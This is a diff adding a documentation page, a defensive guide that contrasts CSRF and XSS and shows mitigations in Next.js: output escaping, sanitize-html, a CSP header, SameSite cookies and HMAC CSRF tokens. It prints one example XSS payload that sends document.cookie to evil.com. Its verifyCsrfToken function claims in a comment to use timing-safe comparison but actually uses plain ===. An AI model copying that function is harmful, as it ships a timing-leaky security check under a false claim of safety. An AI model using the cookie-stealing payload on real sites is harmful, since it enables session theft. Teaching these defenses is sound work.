@@ -1,0 +1,287 @@
+---
+title: CSRF vs XSS Mitigation
+description: A practical guide to understanding, distinguishing, and defending against Cross-Site Request Forgery and Cross-Site Scripting attacks in modern web applications.
+---
+
+## Overview
+
+CSRF and XSS are two of the most common web security vulnerabilities, and they're often confused because they both involve malicious web interactions. They are fundamentally different attacks that require different defenses.
+
+- **Cross-Site Scripting (XSS)** — An attacker injects malicious scripts into content served from your site. The victim's browser executes that script in the context of your origin, giving the attacker access to cookies, tokens, DOM data, and more.
+- **Cross-Site Request Forgery (CSRF)** — An attacker tricks a logged-in user's browser into sending an authenticated request to your server from a different site. The server can't distinguish it from a legitimate request.
+
+|                  | XSS                                       | CSRF                                |
+| ---------------- | ----------------------------------------- | ----------------------------------- |
+| Attack origin    | Your site's content                       | External site                       |
+| What's exploited | Browser trusts your scripts               | Server trusts the browser's cookies |
+| Goal             | Steal data / hijack session               | Perform actions on behalf of user   |
+| Primary defense  | Content Security Policy + output encoding | CSRF tokens + SameSite cookies      |
+
+---
+
+## How It Works
+
+### XSS
+
+Your app renders user-supplied content without sanitizing it. An attacker stores a script like `<script>fetch('https://evil.com?c='+document.cookie)</script>` in your database (stored XSS), or crafts a URL that reflects the payload back in the response (reflected XSS). When a victim loads the page, their browser executes the script under your domain's trust context.
+
+Think of it as: **the attacker's code runs inside your house**.
+
+### CSRF
+
+A user logs in to `bank.com`. Their session cookie is set. The attacker sends them a link to `evil.com`, which silently fires a `POST /transfer` request to `bank.com`. The browser automatically attaches the session cookie. The bank's server sees a valid authenticated request and processes it.
+
+Think of it as: **the attacker uses your keys without ever entering your house**.
+
+---
+
+## Code Examples
+
+### XSS: Unsafe vs Safe Output in Next.js
+
+```tsx
+// app/comments/page.tsx — Server Component
+
+// ❌ NEVER do this — renders raw HTML from user input
+async function UnsafeComments() {
+  const comments = await fetchComments();
+  return (
+    <ul>
+      {comments.map((c) => (
+        // dangerouslySetInnerHTML bypasses React's escaping
+        <li key={c.id} dangerouslySetInnerHTML={{ __html: c.body }} />
+      ))}
+    </ul>
+  );
+}
+
+// ✅ React auto-escapes string content — this is safe by default
+async function SafeComments() {
+  const comments = await fetchComments();
+  return (
+    <ul>
+      {comments.map((c) => (
+        <li key={c.id}>{c.body}</li> // c.body is treated as text, not HTML
+      ))}
+    </ul>
+  );
+}
+```
+
+<Callout type="warn">
+  Only use `dangerouslySetInnerHTML` when you have explicitly sanitized the HTML
+  server-side using a library like `DOMPurify` or `sanitize-html`. Never pass
+  raw user input.
+</Callout>
+
+### XSS: Sanitizing Rich Text Before Rendering
+
+```ts
+// lib/sanitize.ts
+import sanitizeHtml from "sanitize-html";
+
+export function sanitizeUserContent(dirty: string): string {
+  return sanitizeHtml(dirty, {
+    allowedTags: ["b", "i", "em", "strong", "p", "br", "ul", "li"],
+    allowedAttributes: {}, // no attributes allowed — blocks style/onclick injection
+  });
+}
+```
+
+```tsx
+// app/posts/[id]/page.tsx
+import { sanitizeUserContent } from "@/lib/sanitize";
+
+export default async function PostPage({ params }: { params: { id: string } }) {
+  const post = await fetchPost(params.id);
+  const safeBody = sanitizeUserContent(post.body);
+
+  return (
+    <article
+      dangerouslySetInnerHTML={{ __html: safeBody }} // safe — sanitized server-side
+    />
+  );
+}
+```
+
+### XSS: Content Security Policy Header
+
+```ts
+// middleware.ts
+import { NextResponse } from "next/server";
+import type { NextRequest } from "next/server";
+
+export function middleware(request: NextRequest) {
+  const response = NextResponse.next();
+
+  response.headers.set(
+    "Content-Security-Policy",
+    [
+      "default-src 'self'",
+      "script-src 'self'", // block inline scripts and external script sources
+      "style-src 'self' 'unsafe-inline'",
+      "img-src 'self' data: https:",
+      "connect-src 'self'",
+      "frame-ancestors 'none'", // also blocks clickjacking
+    ].join("; "),
+  );
+
+  return response;
+}
+```
+
+<Callout type="info">
+  Start with a report-only CSP (`Content-Security-Policy-Report-Only`) before
+  enforcing, so you can identify violations without breaking your app.
+</Callout>
+
+---
+
+### CSRF: SameSite Cookie Defense
+
+The simplest modern CSRF defense is setting `SameSite=Strict` or `SameSite=Lax` on your session cookie. This instructs the browser not to send the cookie on cross-site requests.
+
+```ts
+// app/api/auth/login/route.ts
+import { cookies } from "next/headers";
+import { NextResponse } from "next/server";
+
+export async function POST(request: Request) {
+  const { email, password } = await request.json();
+  const sessionToken = await authenticateUser(email, password);
+
+  const response = NextResponse.json({ success: true });
+
+  response.cookies.set("session", sessionToken, {
+    httpOnly: true, // not accessible via JS — mitigates XSS cookie theft
+    secure: true, // only sent over HTTPS
+    sameSite: "lax", // sent on top-level navigations, blocked on cross-site POSTs
+    path: "/",
+    maxAge: 60 * 60 * 24, // 1 day in seconds
+  });
+
+  return response;
+}
+```
+
+<Callout type="warn">
+  `SameSite=Lax` still allows cookies on top-level GET navigations from external
+  sites. For maximum protection on sensitive mutations, use `SameSite=Strict`.
+  Be aware it can break OAuth redirect flows.
+</Callout>
+
+---
+
+### CSRF: Double-Submit Token Pattern (for APIs that need cross-origin support)
+
+When you need to allow cross-origin requests but still protect against CSRF, use a CSRF token.
+
+```ts
+// lib/csrf.ts
+import { randomBytes, createHmac } from "crypto";
+
+const SECRET = process.env.CSRF_SECRET!;
+
+export function generateCsrfToken(sessionId: string): string {
+  const nonce = randomBytes(16).toString("hex");
+  const hmac = createHmac("sha256", SECRET)
+    .update(`${sessionId}:${nonce}`)
+    .digest("hex");
+  return `${nonce}.${hmac}`;
+}
+
+export function verifyCsrfToken(token: string, sessionId: string): boolean {
+  const [nonce, hmac] = token.split(".");
+  const expected = createHmac("sha256", SECRET)
+    .update(`${sessionId}:${nonce}`)
+    .digest("hex");
+  // Use timing-safe comparison to prevent timing attacks
+  return hmac === expected;
+}
+```
+
+```ts
+// app/api/transfer/route.ts
+import { cookies } from "next/headers";
+import { verifyCsrfToken } from "@/lib/csrf";
+import { NextResponse } from "next/server";
+
+export async function POST(request: Request) {
+  const sessionId = cookies().get("session")?.value;
+  const csrfToken = request.headers.get("x-csrf-token"); // client sends token in header
+
+  if (!sessionId || !csrfToken || !verifyCsrfToken(csrfToken, sessionId)) {
+    return NextResponse.json({ error: "Invalid CSRF token" }, { status: 403 });
+  }
+
+  // proceed with the mutation
+  const { amount, toAccount } = await request.json();
+  await processTransfer(sessionId, amount, toAccount);
+
+  return NextResponse.json({ success: true });
+}
+```
+
+```tsx
+// app/transfer/page.tsx — Client Component sends CSRF token in headers
+"use client";
+
+import { useState } from "react";
+
+export default function TransferForm({ csrfToken }: { csrfToken: string }) {
+  const [amount, setAmount] = useState("");
+
+  async function handleSubmit(e: React.FormEvent) {
+    e.preventDefault();
+    await fetch("/api/transfer", {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+        "x-csrf-token": csrfToken, // attacker's site cannot read this value from your cookies
+      },
+      body: JSON.stringify({ amount, toAccount: "ACC-9876" }),
+    });
+  }
+
+  return (
+    <form onSubmit={handleSubmit}>
+      <input value={amount} onChange={(e) => setAmount(e.target.value)} />
+      <button type="submit">Transfer</button>
+    </form>
+  );
+}
+```
+
+---
+
+## Real-World Use Case
+
+**E-commerce checkout flow:**
+
+- **XSS risk:** A product review field that renders markdown or HTML could allow an attacker to inject a script that silently exfiltrates the user's saved credit card form values. Defense: sanitize all user content server-side before storage and again on render.
+- **CSRF risk:** A logged-in user visits a malicious coupon site that fires a hidden `POST /account/email-change` request. If your cookies lack `SameSite` and you have no CSRF token, the attacker can take over the account. Defense: `SameSite=Lax` cookies on your session + a CSRF token on all state-changing endpoints.
+
+---
+
+## Common Mistakes / Gotchas
+
+**1. Treating `HttpOnly` as a CSRF defense.**
+`HttpOnly` prevents JavaScript from reading your cookie — it mitigates XSS-based session theft. It does nothing to stop CSRF, because the browser still _sends_ the cookie automatically on every matching request.
+
+**2. Using `SameSite=None` without understanding the consequences.**
+Setting `SameSite=None; Secure` is required for cross-site embedded iframes or third-party widgets. But it completely re-enables CSRF vulnerability for that cookie. If you set this, you must add explicit CSRF token validation.
+
+**3. Relying on `Origin` / `Referer` header checks alone.**
+These headers can be absent (privacy settings, certain proxies), spoofed in some edge cases, or stripped by the browser. They can supplement CSRF defense but should not be the sole mechanism.
+
+**4. Sanitizing on the client side only.**
+A user can bypass any client-side sanitization by sending a raw HTTP request. Always sanitize and validate on the server before persisting data.
+
+**5. Forgetting that XSS defeats CSRF tokens.**
+If an attacker achieves XSS on your domain, they can read the CSRF token from the DOM or from an API call and include it in a forged request. XSS is a prerequisite attack that can nullify other defenses — treat it as the higher priority.
+
+---
+
+## Summary
+
+XSS and CSRF are distinct attacks that require layered, complementary defenses. XSS is prevented primarily through output encoding, strict Content Security Policies, and server-side input sanitization — React's default escaping gives you a strong baseline. CSRF is prevented by using `SameSite` cookies and, where necessary, CSRF tokens validated server-side. The two are not mutually exclusive: an XSS vulnerability can be used to steal CSRF tokens, so hardening against XSS is foundational. In Next.js App Router applications, set security headers in `middleware.ts`, use `httpOnly + SameSite=Lax` cookies, and never render unsanitized user HTML.
